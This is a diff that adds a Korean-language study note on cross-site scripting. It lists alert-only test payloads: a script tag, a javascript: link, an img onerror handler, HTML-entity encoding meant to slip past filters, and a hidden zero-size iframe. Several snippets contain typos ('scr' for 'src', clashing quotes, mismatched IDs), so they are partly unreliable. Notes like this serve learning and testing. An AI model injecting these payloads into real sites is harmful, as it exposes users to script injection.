@@ -1,0 +1,77 @@
+[XSS 심화]
+-Cross site Scripting
+
+-Javascript를 삽입하는 방법임
+
+-이게 가능하면 진짜 기본적인 방어 절차도 없는 것임.
+
+-만약 가능하다면 XSS 해킹기법 특성상 정말 다양한 공격이 가능하므로
+ 이를 이용 가능함.
+===========================
+<script>
+alert("XSS");
+</script>
+
+->기본적으로 XSS가 가능한지 확인
+===========================
+
+[하이퍼링크 이용]
+
+*URL을 통해 JS실행 방법.
+
+<a href="javascript: alert("XSS!");">XSS</a>
+
+->해당 태그를 통해 XSS라는 문구를 클릭시 하이퍼링크를 통해
+   "javascipt:alert("XSS!")"라는 URL링크를 타게되고 이를 통해 JS를 실행할
+   수 있게 된다.
+
+[img태그 이용]
+
+<img scr="#" onerror="alert("XSS!");">
+
+->img가 가져올 사진이 #으로 되어있다. 해당 사진이 없다면 onerrror 속성에
+   의해 JS가 실행되게 된다.
+
+※ 이벤트 핸들러를 이용한 JS 실행이지 URL을 가져오는 것이 아니므로 바로 JS 코드를 삽입하면 된다.
+
+
+[XSS의 아스키코드 응용공격]
+
+-아스키코드에 들어갈 코드를 아스키 코드로 바꾸어 넣어도 XSS가 적용된다.
+
+-해당 방법을 이용하면 XSS가 먹힐때가 있다. 아스키 코드로 바꾸면 대응이 어렵기 때문.
+
+=======================================
+ex)
+javascript:"alert("XSS!");"
+
+ㄴ 변환시.. ㄱ
+
+106 97 118 97 115 99 114 105 112 116 58 34 97 108 101 114 116 40 34 88 83 83 33 34 41 59 34 
+
+->이때 HTML 인코딩을 해야하나부다.(앞에 &#붙이고 뒤에 ;붙이면 된다.)
+
+<iframe scr="&#106;&#97;&#118;...(생략)" width='0' height='0' frameborder="0"></iframe>
+
+=======================================
+
+[iframe태그 이용]
+
+<iframe ID="showframe" src="javascript:document.write(
+'<script> 
+	alert(3);
+	function show(){alert(5);}
+	alert(4);
+</script>'
+)"
+width='0'
+height='0'
+frameborder='0'>
+</iframe>
+<button onclick="document.getElementById("ShowFrame").contentWindow.show();">
+버튼</button>
+
+->iframe의 크기밑 border값을 0으로 맞춘 후에 실행시키면 iframe자체는 브라우저에 표현되지 않지만
+   src속성에 담긴 URL은 호출되므로 해당 URL에 javascript: .... 를 통해
+   JS를 담으면 이를 실행 시킬 수 있다.
+=======================================
